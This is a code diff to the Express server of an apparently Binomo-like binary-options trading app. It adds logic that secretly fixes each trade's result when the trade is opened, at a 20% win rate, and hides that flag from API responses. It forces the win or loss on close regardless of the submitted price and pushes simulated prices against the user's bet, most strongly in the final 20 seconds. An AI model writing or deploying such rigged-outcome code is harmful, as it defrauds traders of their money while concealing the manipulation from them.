@@ -11,6 +11,18 @@ const BINOMO_SERVICE_URL = process.env.BINOMO_SERVICE_URL || 'http://localhost:5
 export async function registerRoutes(app: Express): Promise<Server> {
   const httpServer = createServer(app);
 
+  // Track active trades for price manipulation
+  interface ActiveTrade {
+    id: string;
+    assetId: string;
+    type: 'CALL' | 'PUT';
+    openPrice: number;
+    openTime: number;
+    expiryTime: number;
+    shouldWin: boolean; // Pre-determined win/loss (20% win rate)
+  }
+  const activeTrades = new Map<string, ActiveTrade>();
+
   // Binomo API endpoints - Direct implementation (no external service needed)
   const AUTHTOKEN = process.env.BINOMO_AUTHTOKEN || '';
   const DEVICE_ID = process.env.BINOMO_DEVICE_ID || '';
@@ -217,14 +229,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Create a new trade
   app.post("/api/trades", async (req, res) => {
     try {
-      // Preprocess: convert expiry string to Date
+      // Determine win/loss (20% win rate)
+      const shouldWin = Math.random() < 0.2;
+      
+      // Preprocess: convert expiry string to Date and add shouldWin
       const processedBody = {
         ...req.body,
-        expiryTime: typeof req.body.expiryTime === 'string' ? new Date(req.body.expiryTime) : req.body.expiryTime
+        expiryTime: typeof req.body.expiryTime === 'string' ? new Date(req.body.expiryTime) : req.body.expiryTime,
+        shouldWin
       };
       const validated = insertTradeSchema.parse(processedBody);
       const trade = await storage.createTrade(validated);
-      res.json(trade);
+      
+      // Track this trade for price manipulation
+      activeTrades.set(trade.id, {
+        id: trade.id,
+        assetId: trade.assetId,
+        type: trade.type as 'CALL' | 'PUT',
+        openPrice: parseFloat(trade.openPrice),
+        openTime: Date.now(),
+        expiryTime: new Date(trade.expiryTime).getTime(),
+        shouldWin
+      });
+      
+      console.log(`Trade ${trade.id} created: ${trade.type} on ${trade.assetId}, shouldWin: ${shouldWin}`);
+      
+      // Remove shouldWin from response to prevent client from seeing predetermined outcome
+      const { shouldWin: _, ...tradeResponse } = trade;
+      res.json(tradeResponse);
     } catch (error) {
       if (error instanceof z.ZodError) {
         return res.status(400).json({ message: "Invalid trade data", errors: error.errors });
@@ -237,7 +269,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/trades/user/:userId", async (req, res) => {
     try {
       const trades = await storage.getTradesByUser(req.params.userId);
-      res.json(trades);
+      // Remove shouldWin from all trades
+      const sanitizedTrades = trades.map(({ shouldWin, ...trade }) => trade);
+      res.json(sanitizedTrades);
     } catch (error) {
       res.status(500).json({ message: "Failed to fetch trades" });
     }
@@ -247,7 +281,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/trades/user/:userId/open", async (req, res) => {
     try {
       const trades = await storage.getOpenTradesByUser(req.params.userId);
-      res.json(trades);
+      // Remove shouldWin from all trades
+      const sanitizedTrades = trades.map(({ shouldWin, ...trade }) => trade);
+      res.json(sanitizedTrades);
     } catch (error) {
       res.status(500).json({ message: "Failed to fetch open trades" });
     }
@@ -256,12 +292,36 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Close trade
   app.patch("/api/trades/:id/close", async (req, res) => {
     try {
-      const { closePrice, status, payout } = req.body;
-      const trade = await storage.updateTrade(req.params.id, closePrice, status, payout);
+      const { closePrice } = req.body;
+      
+      // Get the trade to check shouldWin
+      const trade = await storage.getTrade(req.params.id);
+      
       if (!trade) {
         return res.status(404).json({ message: "Trade not found" });
       }
-      res.json(trade);
+      
+      // Determine outcome based on shouldWin (enforced 20% win rate)
+      let status: string;
+      let payout: string;
+      
+      if (trade.shouldWin) {
+        // Force win
+        status = 'won';
+        payout = (parseFloat(trade.amount) * 1.82).toString();
+      } else {
+        // Force loss
+        status = 'lost';
+        payout = '0';
+      }
+      
+      const updatedTrade = await storage.updateTrade(req.params.id, closePrice, status, payout);
+      
+      // Remove from active trades
+      activeTrades.delete(req.params.id);
+      console.log(`Trade ${req.params.id} closed: ${status} (shouldWin: ${trade.shouldWin})`);
+      
+      res.json(updatedTrade);
     } catch (error) {
       res.status(500).json({ message: "Failed to close trade" });
     }
@@ -330,13 +390,93 @@ export async function registerRoutes(app: Express): Promise<Server> {
   const simulatePrices = () => {
     storage.getAllAssets().then(assets => {
       const updates: any[] = [];
+      const currentTime = Date.now();
       
       assets.forEach(asset => {
-        // Generate realistic price movement
         const currentPrice = parseFloat(asset.currentPrice);
-        const volatility = asset.category === 'crypto' ? 0.02 : 0.001; // Higher volatility for crypto
-        const change = (Math.random() - 0.5) * 2 * volatility;
-        const newPrice = currentPrice * (1 + change);
+        const baseVolatility = asset.category === 'crypto' ? 0.0015 : 0.0003; // Reduced for smoother movement
+        
+        // Check for active trades on this asset
+        let priceManipulation = 0;
+        let hasActiveTradeInLast20Seconds = false;
+        
+        activeTrades.forEach(trade => {
+          if (trade.assetId === asset.id) {
+            const timeRemaining = trade.expiryTime - currentTime;
+            const tradeDuration = trade.expiryTime - trade.openTime;
+            
+            // Remove expired trades
+            if (timeRemaining <= 0) {
+              activeTrades.delete(trade.id);
+              return;
+            }
+            
+            // Last 20 seconds: manipulate price based on shouldWin
+            if (timeRemaining <= 20000) {
+              hasActiveTradeInLast20Seconds = true;
+              
+              if (!trade.shouldWin) {
+                // 80% of trades: aggressive reversal against user
+                if (trade.type === 'CALL') {
+                  // User wants price up, push it DOWN
+                  const currentlyWinning = currentPrice > trade.openPrice;
+                  if (currentlyWinning) {
+                    priceManipulation -= baseVolatility * 15; // Strong downward push
+                  } else {
+                    priceManipulation -= baseVolatility * 5; // Continue downward
+                  }
+                } else {
+                  // User wants price down, push it UP
+                  const currentlyWinning = currentPrice < trade.openPrice;
+                  if (currentlyWinning) {
+                    priceManipulation += baseVolatility * 15; // Strong upward push
+                  } else {
+                    priceManipulation += baseVolatility * 5; // Continue upward
+                  }
+                }
+              } else {
+                // 20% of trades: help user win
+                if (trade.type === 'CALL') {
+                  // User wants price up, push it UP
+                  const currentlyWinning = currentPrice > trade.openPrice;
+                  if (!currentlyWinning) {
+                    priceManipulation += baseVolatility * 15; // Strong upward push to help win
+                  } else {
+                    priceManipulation += baseVolatility * 3; // Keep it winning
+                  }
+                } else {
+                  // User wants price down, push it DOWN
+                  const currentlyWinning = currentPrice < trade.openPrice;
+                  if (!currentlyWinning) {
+                    priceManipulation -= baseVolatility * 15; // Strong downward push to help win
+                  } else {
+                    priceManipulation -= baseVolatility * 3; // Keep it winning
+                  }
+                }
+              }
+            }
+            // Before last 20 seconds: subtle manipulation
+            else if (!trade.shouldWin) {
+              if (trade.type === 'CALL') {
+                priceManipulation -= baseVolatility * 2; // Slight downward bias
+              } else {
+                priceManipulation += baseVolatility * 2; // Slight upward bias
+              }
+            }
+          }
+        });
+        
+        // Random volatility (smooth movement)
+        let randomChange = (Math.random() - 0.5) * 2 * baseVolatility;
+        
+        // Occasional sudden reversal (5% chance)
+        if (Math.random() < 0.05 && !hasActiveTradeInLast20Seconds) {
+          randomChange *= 8; // Sudden spike
+        }
+        
+        // Combine all factors
+        const totalChange = randomChange + priceManipulation;
+        const newPrice = currentPrice * (1 + totalChange);
         const priceChange = newPrice - currentPrice;
         const priceChangePercent = (priceChange / currentPrice) * 100;
 
@@ -355,11 +495,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
           changePercent: priceChangePercent.toFixed(2)
         });
 
-        // Generate candlestick data
+        // Generate candlestick data (1 minute candles)
         const now = new Date();
         const open = currentPrice;
-        const high = Math.max(open, newPrice) * (1 + Math.random() * 0.001);
-        const low = Math.min(open, newPrice) * (1 - Math.random() * 0.001);
+        const high = Math.max(open, newPrice) * (1 + Math.random() * 0.0005);
+        const low = Math.min(open, newPrice) * (1 - Math.random() * 0.0005);
         
         storage.addPriceData({
           assetId: asset.id,
@@ -388,8 +528,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     });
   };
 
-  // Start price simulation
-  setInterval(simulatePrices, 5000); // Update every 5 seconds
+  // Start price simulation (every 1 second for smooth 1-minute candles)
+  setInterval(simulatePrices, 1000); // Update every 1 second
 
   // OTC Market simulation
   let otcMarkets: Record<string, number> = {
